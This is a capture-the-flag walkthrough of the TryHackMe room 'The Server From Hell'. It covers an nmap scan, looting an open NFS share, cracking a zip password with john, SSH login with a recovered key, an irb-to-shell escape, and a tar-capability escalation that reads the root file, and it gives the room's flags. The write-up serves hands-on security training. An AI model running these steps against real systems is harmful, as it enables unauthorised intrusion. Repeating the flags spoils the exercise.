# The Server From Hell

Tryhackme The Server From Hell - Linux - Medium

https://tryhackme.com/room/theserverfromhell

## Nmap
```shell
# Nmap 7.93 scan initiated Sun Jun 11 15:46:45 2023 as: nmap -sC -sV -oA nmap/theserverfromhell 10.10.160.231
Nmap scan report for 10.10.160.231
Host is up (0.20s latency).
Not shown: 94 closed tcp ports (conn-refused)
Bug in dicom-ping: no string output.
Bug in ganglia-info: no string output.
Bug in ganglia-info: no string output.
Bug in uptime-agent-info: no string output.
PORT      STATE SERVICE               VERSION
1/tcp     open  tcpmux?
| fingerprint-strings: 
|   NULL: 
|_    550 12345 0000000000000000000000000000000000000000000000000000000
3/tcp     open  compressnet?
| fingerprint-strings: 
|   NULL: 
|_    550 12345 0000000000000000000000000000000000000000000000000000000
4/tcp     open  unknown
| fingerprint-strings: 
|   NULL: 
|_    550 12345 0000000000000000000000000000000000000000000000000000000
6/tcp     open  unknown
| fingerprint-strings: 
|   NULL: 
|_    550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
7/tcp     open  echo?
| fingerprint-strings: 
|   NULL: 
|_    550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00
9/tcp     open  discard?
| fingerprint-strings: 
|   NULL: 
|_    550 12345 0ffffffffff80000088808000000888800000008887ffffffffff00
13/tcp    open  daytime?
| fingerprint-strings: 
|   NULL: 
|_    550 12345 0ffffffff000000888000000000800000080000008800007fffff00
17/tcp    open  qotd?
| fingerprint-strings: 
|   NULL: 
|_    550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00
....
(more output in nmap folder)
```

After `nmap` scan, I am like what the hell, haha. There are tons of services running on server, and this number `12345` keeps getting repeated, therefore I have checked if there is web service hosted on that port, but no, there wasn't.

Using `nc` we can able to connect and got hint about `NFS`.
```shell
└──╼ $nc server.thm 12345
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

```shell
└──╼ $sudo mount -t nfs server.thm:/home/nfs mount -o nolock

└──╼ $cd mount/

└──╼ $ls
backup.zip

└──╼ $cp backup.zip ../

└──╼ $cd ..

└──╼ $zip2john backup.zip > hash.hash
backup.zip/home/hades/.ssh/ is not encrypted!
ver 1.0 backup.zip/home/hades/.ssh/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=2107, decmplen=3369, crc=6F72D66B
ver 1.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/hint.txt PKZIP Encr: 2b chk, TS_chk, cmplen=22, decmplen=10, crc=F51A7381
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/authorized_keys PKZIP Encr: 2b chk, TS_chk, cmplen=602, decmplen=736, crc=1C4C509B
ver 1.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=45, decmplen=33, crc=2F9682FA
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa.pub PKZIP Encr: 2b chk, TS_chk, cmplen=602, decmplen=736, crc=1C4C509B
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.


└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt hash.hash 
...
zxcvbnm          (backup.zip)
1g 0:00:00:00 DONE (2023-06-11 16:01) 5.263g/s 86231p/s 86231c/s 86231C/s 123456..cocoliso
```

When we go to `.ssh` folder we will get `flag.txt`

```
└──╼ $cat flag.txt 
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}
```

##  user flag

```shell
└──╼ $ssh -i id_rsa hades@server.thm
kex_exchange_identification: read: Connection reset by peer
Connection reset by 10.10.160.231 port 22
```

I tried to connect with ssh using `id_rsa`, but can't.


There is a `hint.txt` file where we get hint to scan ports between `2500-4500`. After that we get ssh port on `3333`.

```shell
└──╼ $ssh -i id_rsa hades@server.thm -p 3333
```

After login in ssh, we get some weird shell, I tried using linux commands, but it is giving error, therefore, I have searched error in google and found out that it is ruby shell, and to get linux shell, we have to use `exec` function in ruby.

```shell
irb(main):002:0> whoami
Traceback (most recent call last):
        2: from /usr/bin/irb:11:in `<main>'
        1: from (irb):2
NameError (undefined local variable or method `whoami' for main:Object)
irb(main):003:0> main
Traceback (most recent call last):
        2: from /usr/bin/irb:11:in `<main>'
        1: from (irb):3
NameError (undefined local variable or method `main' for main:Object)
irb(main):004:0> puts "Hello, world!"
Hello, world!
=> nil
irb(main):005:0> 
irb(main):006:0> exec '/bin/sh -i'
$ ls
user.txt
$ cat user.txt
thm{sh3ll_3c4p3_15_v3ry_1337}
```

## root flag

From hints, we executed getcap command.
```shell
$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
```

So, using tar we can take system control, therefore from gtfobins, we got exploit for tar.

```shell
$ tar xf /root/root.txt -I '/bin/sh -c "cat 1>&2"'
thm{w0w_n1c3_3sc4l4t10n}
```